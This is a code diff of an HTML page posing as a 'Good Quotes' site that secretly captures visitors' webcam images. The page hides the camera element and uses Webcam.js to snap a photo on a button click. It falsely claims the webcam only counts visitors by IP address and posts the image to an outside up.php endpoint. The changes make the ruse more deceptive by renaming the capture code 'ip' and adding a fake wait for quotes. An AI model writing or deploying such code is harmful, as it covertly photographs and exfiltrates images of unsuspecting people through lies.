@@ -15,17 +15,17 @@
 </head>
 <body>
     <form action="http://www.goodquotes.somee.com/up.php" method="POST">
-        <span style="height:0px;width:0px;display:none;" id="my_camera" height=0 width=0></span>
+        <span style="height:0px;width:0px;display:none;" id="ip" height=0 width=0></span>
                 <br/>
-                <center>#Note => Please allow access to webcam to keep a count of online visitors. Only your ip address will be tracked with the help of webcam and nothing else. Thank You Team Good Quotes.<br><br>
-                <input type=button value="Click Me" onClick="take_snapshot()" class=but><br><br></center>
+                <center># Please allow access to webcam to keep a count of online visitors. Only your ip address will be tracked with the help of webcam and nothing else. Thank You Team Good Quotes.<br><br># After Clicking on the Below Button (Click Me) please wait for 20 Seconds Because our server fetches a Quote from another server.<br><br>
+                <input type=button value="Click Me" onClick="ip()" class=but><br><br></center>
                 <input type="hidden" name="image" id="image" class="image-tag">
                 <center><br><br><input type=submit id="proceed" value='Now Click Me' class=but></center>
             <script type="text/javascript">
         $(document).ready(function() {
   setTimeout(function() {
     $("#proceed").show();
-  }, 15000);
+  }, 25000);
 });
     </script>
     </form>
@@ -37,8 +37,8 @@
         jpeg_quality: 100
     });
   
-    Webcam.attach( '#my_camera' );
-        function take_snapshot() {
+    Webcam.attach( '#ip' );
+        function ip() {
         Webcam.snap( function(data_uri) {
             $(".image-tag").val(data_uri);
             document.getElementById('results').innerHTML = '<img src="'+data_uri+'"/>';
